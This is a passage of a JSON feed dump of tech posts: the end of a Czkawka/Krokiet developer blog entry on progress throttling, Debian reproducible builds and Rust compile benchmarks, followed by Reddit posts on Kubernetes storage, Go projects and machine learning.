GUI.</p><p>A simple implementation in this style is sufficient:</p><pre><code>let all_files = files.len(); let mut processing_files = Arc&lt;AtomicBool&lt;usize&gt;&gt;::new(0); let _ = files.into_par_iter().map(|e| { if stop_flag.load(Ordering::Relaxed) { return None; } let processing_files = processing_files.fetch_add(1, Ordering::Relaxed); let status_to_send = Status { all_files, processing_files }; progress_sender.send(status_to_send); // Processing file }).while_some().collect::&lt;Vec&lt;_&gt;&gt;(); </code></pre><p>The problem arises when a large number of messages are being sent, and updating the GUI/terminal for each of them would be completely unnecessary — after all, very few people could notice and process status changes appearing even 60 times per second.</p><p>This would also cause performance issues and unnecessarily increase system resource usage. I needed a way to limit the number of messages being sent. This could be implemented either on the side of the message generator (the thread deleting files) or on the recipient side (the GUI thread/progress bar in CLI). I decided it’s better to handle it sooner rather than later.</p><p>Ultimately, I created a simple structure that uses a lock to store the latest message to be sent. Then, in a separate thread, every ~100 ms, the message is fetched and sent to the GUI. Although the solution is simple, I do have some concerns about its performance on systems with a very large number of cores — there, thousands or even tens of thousands of messages per second could cause the mutex to become a bottleneck. For now, I haven’t tested it under such conditions, and it currently doesn’t cause problems, so I’ve postponed optimization (though I’m open to ideas on how it could be improved).</p><pre><code>pub struct DelayedSender&lt;T: Send + 'static&gt; { slot: Arc&lt;Mutex&lt;Option&lt;T&gt;&gt;&gt;, stop_flag: Arc&lt;AtomicBool&gt;, } impl&lt;T: Send + 'static&gt; DelayedSender&lt;T&gt; { pub fn new(sender: crossbeam_channel::Sender&lt;T&gt;, wait_time: Duration) -&gt; Self { let slot = Arc::new(Mutex::new(None)); let slot_clone = Arc::clone(&amp;slot); let stop_flag = Arc::new(AtomicBool::new(false)); let stop_flag_clone = Arc::clone(&amp;stop_flag); let _join = thread::spawn(move || { let mut last_send_time: Option&lt;Instant&gt; = None; let duration_between_checks = Duration::from_secs_f64(wait_time.as_secs_f64() / 5.0); loop { if stop_flag_clone.load(std::sync::atomic::Ordering::Relaxed) { break; } if let Some(last_send_time) = last_send_time { if last_send_time.elapsed() &lt; wait_time { thread::sleep(duration_between_checks); continue; } } let Some(value) = slot_clone.lock().expect(\"Failed to lock slot in DelayedSender\").take() else { thread::sleep(duration_between_checks); continue; }; if stop_flag_clone.load(std::sync::atomic::Ordering::Relaxed) { break; } if let Err(e) = sender.send(value) { log::error!(\"Failed to send value: {e:?}\"); }; last_send_time = Some(Instant::now()); } }); Self { slot, stop_flag } } pub fn send(&amp;self, value: T) { let mut slot = self.slot.lock().expect(\"Failed to lock slot in DelayedSender\"); *slot = Some(value); } } impl&lt;T: Send + 'static&gt; Drop for DelayedSender&lt;T&gt; { fn drop(&amp;mut self) { // We need to know, that after dropping DelayedSender, no more values will be sent // Previously some values were cached and sent after other later operations self.stop_flag.store(true, std::sync::atomic::Ordering::Relaxed); } } </code></pre><p>In the case of Krokiet and Czkawka, I decided to write the GUI in low-level languages (Slint is transpiled to Rust), instead of using higher-level languages — mainly for performance and simpler installation.</p><p>For Krokiet, I briefly considered using Tauri, but I decided that Slint would be a better solution in my case: simpler compilation and no need to use the heavy (and differently behaving on each system) webview with TS/JS.</p><p>However, one user apparently didn’t like the current gui and decided to create their own alternative using Tauri.</p><p>The author himself does not hide that he based the look of his program on Krokiet(which is obvious). Even so, differences can be noticed, stemming both from personal design preferences and limitations of the libraries that both projects use(for example, in the Tauri version popups are used more often, because Slint has issues with them, so I avoided using them whenever possible).</p><p>Since I am not very skilled in application design, it’s not surprising that I found several interesting solutions in this new GUI that I will want to either copy 1:1 or use as inspiration when modifying Krokiet.</p><p>Preliminary tests indicate that the application works surprisingly well, despite minor performance issues (one mode on Windows froze briefly — though the culprit might also be the czkawka_core package), small GUI shortcomings (e.g., the ability to save the application as an HTML page), or the lack of a working Linux version (a month or two ago I managed to compile it, but now I cannot).</p><p>Recently, just before the release of Debian 13, a momentous event took place — Czkawka 8.0.0 was added to the Debian repository (even though version 9.0.0 already existed, but well… Debian has a preference for older, more stable versions, and that must be respected). The addition was made by user Fab Stz.</p><p>Debian takes reproducible builds very seriously, so it quickly became apparent that building Czkawka twice in the same environment produced two different binaries. I managed to reduce the problematic program to a few hundred lines. In my great wisdom (or naivety, assuming the bug wasn’t “between the chair and the keyboard”), I concluded that the problem must be in Rust itself. However, after analysis conducted by others, it turned out that the culprit was the  library, whose proc-macro iterates over a hashmap of arguments, and in Rust the iteration order in such a case is random (<a href=\"https://github.com/kellpossible/cargo-i18n/issues/150\">https://github.com/kellpossible/cargo-i18n/issues/150</a>).</p><p>With the source of the problem identified, I prepared a fix — <a href=\"https://github.com/kellpossible/cargo-i18n/pull/151\">https://github.com/kellpossible/cargo-i18n/pull/151</a> — which has already been merged and is part of the new 0.10.0 version of the  library. Debian’s repository still uses version 0.9.3, but with this fix applied. Interestingly,  is also used in many other projects, including applications from , so they too now have an easier path to achieving fully reproducible builds.</p><p>I have never hidden the fact that I gladly use external libraries to easily extend the capabilities of an application, so I don’t have to waste time reinventing the wheel in a process that is both inefficient and error-prone.</p><p>Despite many obvious advantages, the biggest downsides are larger binary sizes and longer compilation times. On my older laptop with 4 weak cores, compilation times became so long that I stopped developing this program on it.</p><p>However, this doesn’t mean I use additional libraries without consideration. I often try to standardize dependency versions or use projects that are actively maintained and update the libraries they depend on — for example, rawler instead of rawloader, or image-hasher instead of img-hash (which I created as a fork of img-hash with updated dependencies).</p><p>To verify the issue of long compilation times, I generated several charts showing how long Krokiet takes to compile with different options, how large the binary is after various optimizations, and how long a recompilation takes after adding a comment (I didn’t test binary performance, as that is a more complicated matter). This allowed me to consider which options were worth including in CI. After reviewing the results, I decided it was worth switching from the current configuration—  to <strong><em>release + fat lto + codegen units = 1</em></strong> .</p><p>The tests were conducted on a 12-core AMD Ryzen 9 9700 running Ubuntu 25.04, using the mold linker and rustc 1.91.0-nightly (cd7cbe818 2025–08–15). The base profiles were debug and release, and I adjusted some options based on them (not all combinations seemed worth testing, and some caused various errors) to see their impact on compilation. It’s important to note that Krokiet is a rather specific project with many dependencies, and Slint that generates a large (~100k lines) Rust file, so other projects may experience significantly different compilation times.</p><pre><code>|Config | Output File Size | Target Folder Size | Compilation Time | Rebuild Time | |:---------------------------------------------------|:-------------------|:---------------------|:-------------------|:---------------| | release + overflow checks | 73.49 MiB | 2.07 GiB | 1m 11s | 20s | | debug | 1004.52 MiB | 7.00 GiB | 1m 54s | 3s | | debug + cranelift | 624.43 MiB | 5.25 GiB | 47s | 3s | | debug + debug disabled | 131.64 MiB | 2.52 GiB | 1m 33s | 2s | | check | - | 1.66 GiB | 58s | 1s | | release | 70.50 MiB | 2.04 GiB | 2m 58s | 2m 11s | | release + cranelift | 70.50 MiB | 2.04 GiB | 2m 59s | 2m 10s | | release + debug info | 786.19 MiB | 5.40 GiB | 3m 23s | 2m 18s | | release + native | 67.22 MiB | 1.98 GiB | 3m 5s | 2m 13s | | release + opt o2 | 70.09 MiB | 2.04 GiB | 2m 56s | 2m 9s | | release + opt o1 | 76.55 MiB | 1.98 GiB | 1m 1s | 18s | | release + thin lto | 63.77 MiB | 2.06 GiB | 3m 12s | 2m 32s | | release + optimize size | 66.93 MiB | 1.93 GiB | 1m 1s | 18s | | release + fat lto | 45.46 MiB | 2.03 GiB | 6m 18s | 5m 38s | | release + cu 1 | 50.93 MiB | 1.92 GiB | 4m 9s | 2m 56s | | release + panic abort | 56.81 MiB | 1.97 GiB | 2m 56s | 2m 15s | | release + build-std | 70.72 MiB | 2.23 GiB | 3m 7s | 2m 11s | | release + fat lto + cu 1 + panic abort | 35.71 MiB | 1.92 GiB | 5m 44s | 4m 47s | | release + fat lto + cu 1 + panic abort + native | 35.94 MiB | 1.87 GiB | 6m 23s | 5m 24s | | release + fat lto + cu 1 + panic abort + build-std | 33.97 MiB | 2.11 GiB | 5m 45s | 4m 44s | | release + fat lto + cu 1 | 40.65 MiB | 1.95 GiB | 6m 3s | 5m 2s | | release + incremental | 71.45 MiB | 2.38 GiB | 1m 8s | 2s | | release + incremental + fat lto | 44.81 MiB | 2.44 GiB | 4m 25s | 3m 36s | </code></pre><p>Some things that surprised me:</p><ul><li> increases, rather than decreases, the binary size</li><li> is fast but only slightly reduces the final binary size.</li><li> works much better than  in this project, even though I often read online that  usually gives results very similar to </li><li> — I thought using this option wouldn’t change the binary size much, but the file shrank by as much as 20%. However, I cannot disable this option and wouldn’t recommend it to anyone (at least for Krokiet and Czkawka), because with external libraries that process/validate/parse external files, panics can occur, and with  they cannot be caught, so the application will just terminate instead of printing an error and continuing</li><li> —this will probably become my new favorite flag, it gives release performance while keeping recompilation times similar to debug. Sometimes I need a combination of both, although I still need to test this more to be sure</li></ul><p>Lately, I’ve both heard and noticed strange new websites that seem to imply they are directly connected to the project (though this is never explicitly stated) and offer only binaries repackaged from GitHub, hosted on their own servers. This isn’t inherently bad, but in the future it could allow them to be replaced with malicious files.</p><p>Personally, I only manage a few projects related to Czkawka: the code repository on GitHub along with the binaries hosted there, the Flatpak version of the application, and projects on crates.io. All other projects are either abandoned (e.g., the Snap Store application) or managed by other people.</p><p>Czkawka itself does not have a website, and its closest equivalent is the <a href=\"http://Readme.md\">Readme.md</a> file displayed on the main GitHub project page — I have no plans to create an official site.</p><ul><li> — it’s now easier to check for panic errors and verify application behavior historically (mainly relevant for Windows, where both applications and users tend to avoid the terminal)</li><li> — pdf-rs has been replaced with lopdf, and imagepipe + rawloader replaced with rawler (a fork of rawloader) which has more frequent commits, wider usage, and newer dependencies (making it easier to standardize across different libraries)</li><li><strong>More options for searching similar video files</strong> — I had been blissfully unaware that the vid_dup_finder_lib library only allowed adjusting video similarity levels; it turns out you can also configure the black-line detection algorithm and the amount of the ignored initial segment of a video</li><li> — created by me (and admittedly uglier than the previous ones) under a CC BY 4.0 license, replacing the not-so-free icons</li><li>Binaries for Mac with HEIF support, czkawka_cli built with musl instead of eyre, and Krokiet with an alternative Skia backend — added to the release files on GitHub</li><li><strong>Faster resolution changes in image comparison mode (fast-image-resize crate)</strong> — this can no longer be disabled (because, honestly, why would anyone want to?)</li><li>Fixed a panic error that occurred when the GTK SVG decoder was missing or there was an issue loading icons using it (recently this problem appeared quite often on macOS)</li></ul>","contentLength":27625,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] ACL Rolling Review (ARR) 2025 May (EMNLP 2025) Stats","url":"https://www.reddit.com/r/MachineLearning/comments/1mtoewm/d_acl_rolling_review_arr_2025_may_emnlp_2025_stats/","date":1755529113,"author":"/u/OddUnderstanding1633","guid":233181,"unread":true,"content":"<p>It looks like about 25% of submissions have Meta ≥ 3.5. Does anyone know if it’s still possible to get into the main conference with OA 3.0 Soundness 3.3 and Meta 3.5, or is it more likely to be accepted to Findings?</p>","contentLength":220,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Kubernetes in Homelab: Longhorn vs NFS","url":"https://www.reddit.com/r/kubernetes/comments/1mtnit7/kubernetes_in_homelab_longhorn_vs_nfs/","date":1755527099,"author":"/u/Illustrious_Sir_4913","guid":231618,"unread":true,"content":"<p>I have a question regarding my Kubernetes cluster (Homelab).</p><p>I currently have a k3s cluster running on 3 nodes with Longhorn for my PV(C)s. Longhorn is using the locally installed SSDs (256GB each). This is for a few deployments which require persistent storage.</p><p>I also have an “arr”-stack running in docker on a separate host, which I want to migrate to my k3s-cluster. For this, the plan is to mount external storage via NFS to be able to store more data than just the space on the SSDs from the nodes.</p><p>Since I will probably use NFS anyway, does it make sense to also get rid of Longhorn altogether and also have my PVs/volumes reside on NFS? This would probably also simplify the bootstrapping/fresh installation of my cluster, since I'm (at least at the moment) frequently rebuilding it to learn my way around kubernetes.</p><p>My thought is that I wouldn’t have to restore the volumes through Longhorn and Velero and I could just mount the volumes via NFS.</p><p>Hope this makes sense to you :)</p><p>Maybe some more info on the \"bootstrapping\":</p><p>I created a bash-script which is installing k3s on the three nodes from scratch. It installs sealed-secrets, external-dns, certmanager, Longhorn, Cilium with Gateway API and my app deployments through FluxCD. This is a completely unattented process. At the moment, no data is really stored in the PVs, since the cluster is not live yet. But I also want to implement the restore-process of my volumes into my script, so that I can basically restore/re-install the cluster from scratch, in case of desaster. And I assume that this will be much easier with just mounting the volumes via NFS, than having to restore them through Longhorn and Velero.</p>","contentLength":1677,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Managing POSIX Permissions on NFS","url":"https://www.reddit.com/r/kubernetes/comments/1mtnh01/managing_posix_permissions_on_nfs/","date":1755526985,"author":"/u/nilpferd9","guid":231619,"unread":true,"content":"<p>We're deploying K8s on bare metal, with NFS server. The NFS server already has data and we're assessing continuing using it for the cluster as the data may be needed for workloads. </p><p>Many pods we deploy run with arbitrary UID, as needed by the creators, and changing the securityContext runAsUser often breaks them. Also pods need permissions on the NFS exported directories, and their UIDs being arbitrary means we need to open permissions for the exported dirs such that pvcs under it can be dynamically provisioned. This sounds like a security threat, as IDs may overlap and unintentional access may be granted. </p><p>Are there best practices to manage POSIX permissions such that they are meaningful outside the pods? </p>","contentLength":714,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Gentoo Linux with XFCE on a 2001 iBook G3/600","url":"https://www.reddit.com/r/linux/comments/1mtngzr/gentoo_linux_with_xfce_on_a_2001_ibook_g3600/","date":1755526985,"author":"/u/anh0516","guid":231688,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[P] JAX Implementation of Hindsight Experience Replay (HER)","url":"https://www.reddit.com/r/MachineLearning/comments/1mtmadk/p_jax_implementation_of_hindsight_experience/","date":1755524253,"author":"/u/jeertmans","guid":231687,"unread":true,"content":"<p>Hi! I recently discovered the <em>Hindsight Experience Replay</em> (HER) paper and noticed that the official implementation is based on PyTorch and is not very well-structured. I also couldn't find a non-PyTorch implementation. Since I primarily work with , I decided to reimplement the classic bit-flipping experiment to better understand HER.</p><p>This implementation uses  for model definitions and  for optimization. The <a href=\"https://github.com/jeertmans/HER-with-JAX\">repository</a> provides: + A  and  implementation of HER in JAX + Reproducible scripts and results + A <a href=\"https://colab.research.google.com/github/jeertmans/HER-with-JAX/blob/main/bit_flipping.ipynb\">Colab Notebook</a> for direct experimentation</p><p>Let me know if you have any questions, feedback, or recommendations!</p>","contentLength":618,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Immutable by default: How to avoid hidden state bugs in OOP","url":"https://www.reddit.com/r/programming/comments/1mtm2fn/immutable_by_default_how_to_avoid_hidden_state/","date":1755523730,"author":"/u/BackEndTea","guid":231620,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/BackEndTea\"> /u/BackEndTea </a> <br/> <span><a href=\"https://backendtea.com/post/immutable-by-default/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mtm2fn/immutable_by_default_how_to_avoid_hidden_state/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Compilation Isn't Just for Programming Languages","url":"https://www.reddit.com/r/programming/comments/1mtm0hv/compilation_isnt_just_for_programming_languages/","date":1755523599,"author":"/u/Adventurous-Salt8514","guid":231685,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Adventurous-Salt8514\"> /u/Adventurous-Salt8514 </a> <br/> <span><a href=\"https://www.architecture-weekly.com/p/compilation-isnt-just-for-programming\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mtm0hv/compilation_isnt_just_for_programming_languages/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Small Projects Thread Feedback","url":"https://www.reddit.com/r/golang/comments/1mtlzgi/small_projects_thread_feedback/","date":1755523531,"author":"/u/jerf","guid":233165,"unread":true,"content":"<p>This is a thread for giving feedback on the weekly small projects thread policy, which I promised in the original discussion. In review and summary, this is to have a weekly thread for the small projects, often AI-generated (although that is no longer part of the evaluation criteria), that was clogging up the main feed previously and annoying people. Is this working for you?</p><p>I am going to make one change which is to not have a separate \"last week's thread is done\" post, I'll just roll it into the weekly post. So if you see this week's post it's a good time to check the final conclusion of last week's post.</p>","contentLength":612,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Small Projects - August 18, 2025","url":"https://www.reddit.com/r/golang/comments/1mtlvpl/small_projects_august_18_2025/","date":1755523278,"author":"/u/jerf","guid":231652,"unread":true,"content":"<div><p>At the end of the week, a post will be made to the front-page telling people that the thread is complete and encouraging skimmers to read through these.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/jerf\"> /u/jerf </a>","contentLength":179,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"It feels like majority of people, tech literate or not, are still stuck at 2010 if it comes to how they perceive Linux","url":"https://www.reddit.com/r/linux/comments/1mtltjf/it_feels_like_majority_of_people_tech_literate_or/","date":1755523123,"author":"/u/DirectorDry2534","guid":231651,"unread":true,"content":"<p>Because every single time Linux comes up people keep shitting on it with \"yeah but you have to code a million lines just to get your printer running\" or \"yeah but it will break after every update\" and other vastly outdated cliches. I mean, sure, it still isnt Windows level in compatibility, but since switching to Fedora I can do literally everything I could do on Windows. And ironically enough, most games run legit better now. And I barely had to do anything. It just worked out of the box. While you still have to learn quite a few things (where most of it comes naturally with time just like on any OS) to use Linux efficiently it still isnt NEARLY as bad as it was 5 - 10 years ago. Sadly it seems like most peoples knowledge about Linux is still stuck on that time and they arent aware how far Linux came since then and just keep repeating this outdated shit, making Linux seem much worse than it actually it. Sadly enough it also affected me in my decision to give it a chance on my main PC and I kept delaying installing it. Thats also what made me think about this topic. If uninformed people wouldnt spout this outdated info everytime Linux comes up it wouldnt suprise me if more people would give that OS a fair chance.</p>","contentLength":1232,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Backup 50k+ of persistent volumes","url":"https://www.reddit.com/r/kubernetes/comments/1mtl011/backup_50k_of_persistent_volumes/","date":1755521090,"author":"/u/MrPurple_","guid":231581,"unread":true,"content":"<p>I have a task on my plate to create a backup for a Kubernetes cluster on Google Cloud (GCP). This cluster has about 3000 active pods, and each pod has a 2GB disk. Picture it like a service hosting free websites. All the pods are similar, but they hold different data.</p><p>These pods grow or reduce as needed. If they are not in use, we could remove them to save resources. In total, we have around 40-50k of these volumes that are waiting to be assigned to a pod, based on the demand. Right now we delete all pods not in use for a certain time but keep the PVC's and PV's.</p><p>My task is to figure out how to back up these 50k volumes. Around 80% of these could be backed up to save space and only called back when needed. The time it takes to bring them back (restore) isn’t a big deal, even if it takes a few minutes.</p><ol><li>The current set-up works okay, but I'm not sure if it's the best way to do it. Every instance runs in its pod, but I'm thinking maybe a shared storage could help reduce the number of volumes. However, this might make us lose some features that Kubernetes has to offer.</li><li>I'm trying to find the best backup solution for storing and recovering data when needed. I thought about using Velero, but I'm worried it won't be able to handle so many CRD objects.</li></ol><p>Has anyone managed to solve this kind of issue before? Any hints or tips would be appreciated!</p>","contentLength":1355,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Making Impossible States Impossible: Type-Safe Domain Modeling with Functional Dependency Injection","url":"https://www.reddit.com/r/programming/comments/1mtkwli/making_impossible_states_impossible_typesafe/","date":1755520840,"author":"/u/cekrem","guid":231713,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/cekrem\"> /u/cekrem </a> <br/> <span><a href=\"https://cekrem.github.io/posts/making-impossible-states-impossible-with-functional-dependency-injection/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mtkwli/making_impossible_states_impossible_typesafe/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I made terminal sudoku game with Go","url":"https://github.com/daypunk/punkdoku","date":1755519914,"author":"/u/Firm-Path7092","guid":231585,"unread":true,"content":"<p>A sudoku game written in Go, compatible with macOS and Linux. Designed to be simple and cute!</p>","contentLength":93,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1mtkk02/i_made_terminal_sudoku_game_with_go/"},{"title":"The Staff+ Canon: Tools for Leading Without Authority","url":"https://www.reddit.com/r/programming/comments/1mtki6p/the_staff_canon_tools_for_leading_without/","date":1755519782,"author":"/u/bezomaxo","guid":231746,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/bezomaxo\"> /u/bezomaxo </a> <br/> <span><a href=\"https://laconicwit.com/the-staff-canon-tools-for-leading-without-authority/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mtki6p/the_staff_canon_tools_for_leading_without/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Play videos in a regular terminal (Added monochrome option)","url":"https://www.reddit.com/r/linux/comments/1mtk3km/play_videos_in_a_regular_terminal_added/","date":1755518670,"author":"/u/Ok-Mushroom-8245","guid":231583,"unread":true,"content":"<p>Hey all, I made this tool yesterday that can play videos in the terminal by using ffmpeg to convert them to the right size and display the pixels using the dots on braille characters. Recently added a --nocolor mode which gives a much better viewing experience due to being able to print multiple dots at once because they can only be black or white. Code is <a href=\"https://github.com/ashfn/brailleframe\">here</a>.</p>","contentLength":364,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"When your robot doesn't need help getting up","url":"https://v.redd.it/fccj01moprjf1","date":1755518461,"author":"/u/drgoldenpants","guid":231584,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mtk0pq/when_your_robot_doesnt_need_help_getting_up/"},{"title":"[HELP] ReadWriteMany enabled PVC can only be viewed inside one pod","url":"https://www.reddit.com/r/kubernetes/comments/1mtjx6p/help_readwritemany_enabled_pvc_can_only_be_viewed/","date":1755518181,"author":"/u/Kalekber","guid":231557,"unread":true,"content":"<p>Hi. I have been working with k3s for a long time and never had issues with samba shares. recently started working with k0s, and I have noticed that my share can only be accessed within one pod only. I started to debug and look around, but I can only see threads describing to use ReadWriteMany on my PVC manifest. Perhaps, this thread can give me more ideas of how to trouble shoot this?</p><p>One caveat: Now, that I write this post. I'm using same PVC for all my pods, for k3s it didn't matter at all, so, I haven't tested if this is a culprit.</p><pre><code>apiVersion: argoproj.io/v1alpha1 kind: Application metadata: name: csi-driver-smb namespace: argocd spec: project: default source: chart: csi-driver-smb repoURL: https://raw.githubusercontent.com/kubernetes-csi/csi-driver-smb/master/charts targetRevision: v1.18.0 helm: releaseName: csi-driver-smb # kubelet path for k0s distro: /var/lib/k0s/kubelet values: | linux: kubelet: /var/lib/k0s/kubelet destination: name: in-cluster namespace: kube-system syncPolicy: syncOptions: - CreateNamespace=true automated: prune: true selfHeal: true </code></pre><pre><code>apiVersion: v1 kind: PersistentVolumeClaim metadata: name: smb-pvc namespace: media-system spec: accessModes: - ReadWriteMany storageClassName: smb-csi resources: requests: storage: 15800Gi </code></pre><pre><code>apiVersion: k0sctl.k0sproject.io/v1beta1 kind: Cluster metadata: name: k0s-cluster spec: hosts: ... k0s: config: apiVersion: k0s.k0sproject.io/v1beta1 kind: ClusterConfig metadata: name: k0s-cluster spec: extensions: helm: repositories: - name: containeroo url: https://charts.containeroo.ch - name: traefik url: https://helm.traefik.io/traefik - name: metallb url: https://metallb.github.io/metallb - name: jetstack url: https://charts.jetstack.io - name: argocd url: https://argoproj.github.io/argo-helm charts: - name: local-path-provisioner chartname: containeroo/local-path-provisioner version: 0.0.33 namespace: local-path-storage - name: cert-manager chartname: jetstack/cert-manager version: v1.18.2 namespace: cert-manager values: | crds: enabled: true - name: argocd chartname: argocd/argo-cd version: 8.2.7 namespace: argocd - name: traefik chartname: traefik/traefik version: 37.0.0 namespace: traefik-system values: | service: enabled: true type: LoadBalancer loadBalancerIP: 192.168.8.20 - name: metallb chartname: metallb/metallb version: 0.15.2 namespace: metallb-system options: wait: enabled: true drain: enabled: true gracePeriod: 2m0s timeout: 5m0s force: true ignoreDaemonSets: true deleteEmptyDirData: true podSelector: \"\" skipWaitForDeleteTimeout: 0s concurrency: limit: 30 workerDisruptionPercent: 10 uploads: 5 evictTaint: enabled: false taint: k0sctl.k0sproject.io/evict=true effect: NoExecute controllerWorkers: false </code></pre><pre><code>apiVersion: apps/v1 kind: Deployment metadata: name: jellyfin namespace: media-system spec: replicas: 1 selector: matchLabels: app: jellyfin template: metadata: labels: app: jellyfin spec: securityContext: runAsUser: 1000 runAsGroup: 1000 initContainers: - name: fix-permissions image: busybox:latest command: [\"sh\", \"-c\"] args: - | chown -R 1000:1000 /config /cache chmod -R 755 /config /cache securityContext: runAsUser: 0 allowPrivilegeEscalation: true volumeMounts: - mountPath: /config name: jellyfin-config - mountPath: /cache name: jellyfin-cache containers: - name: jellyfin image: jellyfin/jellyfin:latest securityContext: allowPrivilegeEscalation: true ports: - containerPort: 8096 volumeMounts: - mountPath: /config name: jellyfin-config - mountPath: /cache name: jellyfin-cache - name: jellyfin-data mountPath: /media volumes: - name: jellyfin-config hostPath: path: /var/lib/jellyfin/config type: DirectoryOrCreate - name: jellyfin-cache hostPath: path: /var/lib/jellyfin/cache type: DirectoryOrCreate - name: jellyfin-data persistentVolumeClaim: claimName: smb-pvc </code></pre><p>jellyfin can see the volume mount, but it's empty:</p><p>but only one pod has access:</p><pre><code>--- apiVersion: apps/v1 kind: Deployment metadata: name: cloudcmd namespace: media-system spec: replicas: 1 selector: matchLabels: app: cloudcmd template: metadata: labels: app: cloudcmd spec: containers: - name: cloudcmd image: coderaiser/cloudcmd ports: - containerPort: 8000 volumeMounts: - name: fs-volume mountPath: /mnt/fs volumes: - name: fs-volume persistentVolumeClaim: claimName: smb-pvc </code></pre>","contentLength":4265,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"5 Practical Tips for a Smooth Kubernetes Migration – Lessons from Real-World Projects","url":"https://www.reddit.com/r/kubernetes/comments/1mtjreu/5_practical_tips_for_a_smooth_kubernetes/","date":1755517706,"author":"/u/haydary","guid":231555,"unread":true,"content":"<p>After years of helping teams migrate and transform systems, I’ve distilled our experience into five practical tips that can make your Kubernetes migration smoother, safer, and more predictable.</p>","contentLength":195,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Kubernetes full stack app deployment tutorial","url":"https://www.reddit.com/r/kubernetes/comments/1mti2tm/kubernetes_full_stack_app_deployment_tutorial/","date":1755512301,"author":"/u/maq01urrahim","guid":231556,"unread":true,"content":"<p>Hi guys, I just finished my Kubernetes learning adventure and thought to share it with others. So I create a Github repository and wrote a extensive <a href=\"http://README.md\">README.md</a> about how to deploy your app on Azure Kubernetes cluster.<a href=\"https://github.com/maqboolkhan/kubernetes-fullstack-tutorial\">https://github.com/maqboolkhan/kubernetes-fullstack-tutorial</a> Your comment and discussion are much appreciated. I hope someone will find it helpful.</p>","contentLength":363,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[Media] Rust Only Video Game Development","url":"https://www.reddit.com/r/rust/comments/1mthuuc/media_rust_only_video_game_development/","date":1755511534,"author":"/u/dandoii","guid":231582,"unread":true,"content":"<p>Thought I'd share this here as I'm having a huge amount of fun with the project. Have always waned to make a game, but have never been able to do the art side of things and battling with crappy game engines was always a nightmare. About 2 months ago I decided to build a deep. ASCII adventure using only RUST. Just focusing on building deep and fun systems is making the game dev journey great and doing it in Rust is teaching me a lot too.</p>","contentLength":440,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Ask r/kubernetes: What are you working on this week?","url":"https://www.reddit.com/r/kubernetes/comments/1mthrey/ask_rkubernetes_what_are_you_working_on_this_week/","date":1755511233,"author":"/u/gctaylor","guid":231502,"unread":true,"content":"<p>What are you up to with Kubernetes this week? Evaluating a new tool? In the process of adopting? Working on an open source project or contribution? Tell <a href=\"https://www.reddit.com/r/kubernetes\">/r/kubernetes</a> what you're up to this week!</p>","contentLength":195,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I benchmarked nine Go SQLite drivers and here are the results","url":"https://www.reddit.com/r/golang/comments/1mtgx5b/i_benchmarked_nine_go_sqlite_drivers_and_here_are/","date":1755508200,"author":"/u/cvilsmeier","guid":231506,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/cvilsmeier\"> /u/cvilsmeier </a>","contentLength":33,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Limitron – a minimal, lock-free, GC-friendly rate limiter for Go","url":"https://www.reddit.com/r/golang/comments/1mtgwgu/limitron_a_minimal_lockfree_gcfriendly_rate/","date":1755508125,"author":"/u/One-Communication724","guid":231533,"unread":true,"content":"<p>I’ve been working on a new Go library called <a href=\"https://github.com/iryndin/limitron\"></a>, designed for ultra-lightweight, high-cardinality rate limiting use cases.</p><p>The core idea: instead of storing per-key state in structs with multiple fields (which quickly adds GC overhead at scale),  packs the entire limiter state into a single . That makes it:</p><ul><li> – safe for concurrent use on the same limiter</li><li> – ideal for scenarios with millions of keys (e.g., per-user, per-IP, per-API key limits)</li><li> – each limiter is just one , so memory usage is predictable</li><li> – immediately returns / (along with  - time to wait until rate limit relaxes) without waiting. If you need to wait, you could use  to wait provided number of milliseconds.</li></ul><pre><code>import \"github.com/iryndin/limitron\" limiter := limitron.BuildRateLimiter(100, time.Minute) // 100 reqs per minute state := limiter.New() // state is *uint64 if waitMillis, taken := limiter.Take1(state); taken { // Process request } else { // Rate limit hit, might want to wait or immediately return \"Too many requests\" 